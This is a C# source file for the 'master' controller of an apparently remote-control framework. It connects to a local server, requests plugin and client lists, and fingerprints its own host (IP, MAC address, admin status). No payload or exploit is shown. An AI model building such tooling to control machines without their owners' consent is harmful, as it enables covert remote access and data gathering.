using Platinium.Shared.Content;
using Platinium.Shared.Core;
using Platinium.Shared.Data.Packages;
using Platinium.Shared.Data.Serialization;
using Platinium.Shared.Info;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;

namespace Platinium
{
    namespace Entities
    {
        public class PlatiniumMaster
        {
            private ClientInfo MasterInfo = BuildMasterInfo();
            private TcpClient masterSocket = new TcpClient();
            private NetworkStream serverStream = default(NetworkStream);
            private bool isConnected = false;
            public PlatiniumMaster()
            {
                //Console.Title = "Platinium Beta Master";
            }
            public void Initialize()
            {
                try
                {
                    masterSocket.Connect(new IPEndPoint(IPAddress.Parse("127.0.0.1"), 55555));
                    serverStream = masterSocket.GetStream();
                    Package package = new Package(null, MasterInfo, PackageType.Base, MasterInfo, new ClientInfo(BaseInfoType.Server));
                    TransportPackage TransportPackage = Serializer.Serialize(package);
                    serverStream.Write(TransportPackage.Data, 0, TransportPackage.Data.Length);
                    serverStream.Flush();
                    Thread GetThread = new Thread(Get);
                    GetThread.Start();
                    //Thread WriteThread = new Thread(Write);
                    //WriteThread.Start();
                    //Write(new Package("TEST|Action", null, PackageType.PluginCommand, MasterInfo, new ClientInfo("2")));
                    isConnected = true;
                }
                catch (Exception) { }
            }
            public void GetPlugins()
            {
                Write(new Package("LOAD_PLUGINS", null, PackageType.Data, MasterInfo, new ClientInfo(BaseInfoType.Server)));
            }
            public void GetClients()
            {
                Write(new Package("CLIENT_LIST", null, PackageType.Data, MasterInfo, new ClientInfo(BaseInfoType.Server)));
            }
            private void Write(Package package)
            {
                try
                {
                    TransportPackage TransportPackage = Serializer.Serialize(package);
                    serverStream.Write(TransportPackage.Data, 0, TransportPackage.Data.Length);
                    serverStream.Flush();
                    Console.WriteLine("WRITE");
                }
                catch (Exception) { isConnected = false; }
            }
            private void Get()
            {
                while (true)
                {
                    serverStream = masterSocket.GetStream();
                    TransportPackage TransportPackage = new TransportPackage();
                    try
                    {
                        serverStream.Read(TransportPackage.Data, 0, TransportPackage.Data.Length);
                    }
                    catch (Exception) { isConnected = false; MessageBox.Show("Unable to read data from the server"); break; }
                    Package package = (Package)Serializer.Deserialize(TransportPackage);
                    package = PackageFactory.HandleMasterPackages(package);
                    Console.WriteLine(package.Content.EmptyIfNull());
                    Console.WriteLine(package.PackageType.ToString());
                    Console.WriteLine("GET");
                }
            }
            private static ClientInfo BuildMasterInfo()
            {
                ClientInfo ci = new ClientInfo
                {
                    IP = CFunctions.GetPublicIP(),
                    MACAddress = CFunctions.GetMacAddress(),
                    UserName = "MASTER",
                    ComputerName = CFunctions.GetComputerName(),
                    UID = FingerPrint.Value(),
                    Type = BaseInfoType.Master,
                    IsAdministrator = CFunctions.IsAdministrator(),
                    Language = CFunctions.GetCurrentCulture(),
                    AppNetVersion = CFunctions.GetAppNetVersion(),
                    OSName = CFunctions.GetOSName()
                };
                return ci;
            }
        }
    }

}